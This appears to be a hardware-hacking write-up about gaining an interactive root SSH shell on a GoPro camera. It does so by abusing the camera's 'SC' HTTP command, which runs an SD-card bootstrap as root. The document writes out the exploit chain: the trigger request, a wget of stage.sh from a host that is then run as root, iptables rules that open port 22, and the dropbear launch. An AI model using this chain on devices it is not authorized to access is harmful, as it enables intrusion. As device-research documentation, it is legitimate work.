# Root shell over SSH: dropbear from the SD card

The `SC` command gives root code execution
([`how-it-works.md`](how-it-works.md)). This turns that primitive into an
interactive, key-only root shell on `0.0.0.0:22`, reachable over the camera's
USB gadget at `172.23.148.51`.

**Verified on hardware:** `ssh root@172.23.148.51 id` → `uid=0(root)`,
uname `Linux gopro 4.19.124 … aarch64 GNU/Linux`.

```
card: scheduled_capture.sh  (bootstrap)
  |
  |  GET /gp/gpCamera?cmd=SC&p=%02
  v
gpNet -> system("/tmp/fuse_d/scheduled_capture.sh&")     (root)
  |
  +-- wget http://<host>:8000/stage.sh   -> /tmp/stage.sh   (+ card fallback)
  +-- run stage.sh:  /dev/dropbear/{dropbearmulti,authorized_keys,hostkey}
  |                  iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
  |                  dropbear -D /dev/dropbear -p 0.0.0.0:22 -s -g
  v
ssh root@172.23.148.51
```

Keeping the logic in `stage.sh` on the build host matters: the card payload is
only a bootstrap, so the installer can be changed and re-triggered without
pulling the card ([`../scripts/serve.sh`](../scripts/serve.sh),
[`../scripts/arm.sh`](../scripts/arm.sh)).

## 1. Why a static musl dropbear

The camera is aarch64 glibc, but the vendored binary is a static **musl** build
of Dropbear 2026.94: no dynamic loader, no libc coupling, and it avoids the
statically-linked-glibc NSS caveat where `getpwnam()` wants a matching
`libnss_files.so` at runtime. Password authentication and zlib are compiled out
(`localoptions.h`); dropping password auth also removes the `crypt()`
dependency, which is what makes a dependency-free static build possible.

Build: [`../payloads/dropbear/README-BUILD.md`](../payloads/dropbear/README-BUILD.md).

## 2. The firewall

Inbound is `DROP` by default, with per-interface chains:

```
-P INPUT DROP
-A INPUT -i ap0  -g SMARTY      # tcp 80/8080/8081, udp 8554/67/68
-A INPUT -i usb0 -g SMARTY
-A INPUT -j REJECT
```

`gpNet` itself opens ports the same way — its TFTP path carries the literal
commands `/usr/sbin/iptables -I INPUT 1 … --dport 69 -j ACCEPT` and
`-D INPUT 1`. So `/usr/sbin/iptables` exists and inserting at rule 1 is the
sanctioned pattern. The installer does that for tcp/22, guarded by
`iptables -C` so re-runs do not stack rules.

**Caveat:** gpNet's cleanup is a *positional* `-D INPUT 1`; if its TFTP path
runs after us it could delete our rule instead of its own. Re-arm to restore it.

## 3. Choosing a state directory — three traps

The SD card is a **FUSE** mount (`ipcufs`): shell scripts run from it (because
`/bin/sh` *reads* the file), but a binary should not be executed from it. The
installer copies `dropbearmulti` to a local filesystem and proves it runs
(`dropbear -V`) before starting it.

Where that copy lives is the fiddly part, because dropbear's
`checkpubkeyperms()` walks **every ancestor** of `authorized_keys` and refuses
any that is group- or world-writable:

1. **`/tmp` and `/run` are bare tmpfs**, which the kernel defaults to mode
   **1777**. `-D /run/dropbear` fails authentication with no useful error.
   1777 shows as `drwxrwxrwt` — the world-write slot reads `t`, not `w`, so a
   naive permission check misses it.
2. **The rootfs is read-only**: `/dev/root / ext4 ro`, and `/usr/local/gopro`
   and `/home/root` are read-only too. They cannot hold state.
3. **gpNet runs the payload with an unrestricted umask**, so a plain
   `mkdir /run/dropbear` creates **0777** — dropbear then refuses the key
   because *our own directory* is world-writable. The installer sets
   `umask 022` and `chmod 700` before validating, which is the fix that made
   authentication work.

`/dev` is devtmpfs mounted with an explicit `mode=755`, and it is writable, so
`/dev/dropbear` is the state directory (700, root). It is runtime state and
does not survive a reboot.

## 4. Host identity

`scripts/install-card.sh` generates `dropbear_hostkey` once per card
(`dropbearkey -t ed25519` under `qemu-aarch64`) and the installer copies it to
the state directory, so the camera's SSH identity is stable across re-arms.

## 5. Persistence: there is none, by design

Nothing can auto-start dropbear at boot:

- the rootfs is read-only, so there is no init hook to install
  (`/etc/init.d`, `/etc/rcS.d` are on the `ro` image);
- `/dev/dropbear` is devtmpfs and the iptables rule is runtime state;
- the card's `autoexec.sh` runner does not execute on retail firmware.

Re-arm after every power cycle:

```sh
./scripts/arm.sh          # usb-up + SC trigger + ssh check
```

`arm.sh` serves `payloads/dropbear/` over HTTP for the duration of the trigger,
so the camera always runs the current `stage.sh` from this checkout. The card's
own copy of `stage.sh` is only a fallback for when the host is not serving.

## 6. Building and servicing the card

```sh
./scripts/install-card.sh /media/$USER/<CARD> ~/.ssh/id_ed25519.pub
```

That writes `scheduled_capture.sh` (bootstrap), `stage.sh`, `dropbearmulti`,
`authorized_keys` and `dropbear_hostkey` to the card root. Only the bootstrap
and the binary/keys are strictly needed at runtime; `stage.sh` is the offline
fallback.

## 7. Diagnosing a failed install

The payload cannot assume a working shell, so it reports over the one channel
proven to work — the same HTTP fetch it uses to get `stage.sh`:

- every step does a `wget` of `/beacon/<step>`; the access log of the host HTTP
  server is the progress trace;
- on exit the whole install log is replayed one line per request (`/beacon/LOG:…`);
- the card also gets `/tmp/fuse_d/DROPBEAR_LOG.txt` and
  `DCIM/100GOPRO/DROPBEAR_LOG.TXT`.

Two BusyBox 1.27 quirks that bit during development: `head -200` is invalid
(use `head -n 200`), and `nc` has no `-w` option (`nc [-l] [-p PORT] [IPADDR
PORT]`).

## 8. Uninstall

```sh
ssh root@<cam> 'killall -9 dropbearmulti; \
  /usr/sbin/iptables -D INPUT -p tcp --dport 22 -j ACCEPT; \
  rm -rf /dev/dropbear'
```

Then remove `scheduled_capture.sh`, `stage.sh`, `dropbearmulti`,
`authorized_keys`, `dropbear_hostkey`, `DROPBEAR_LOG.txt` and
`DCIM/100GOPRO/DROPBEAR_LOG.TXT` from the card. A power cycle clears any
remaining runtime state.
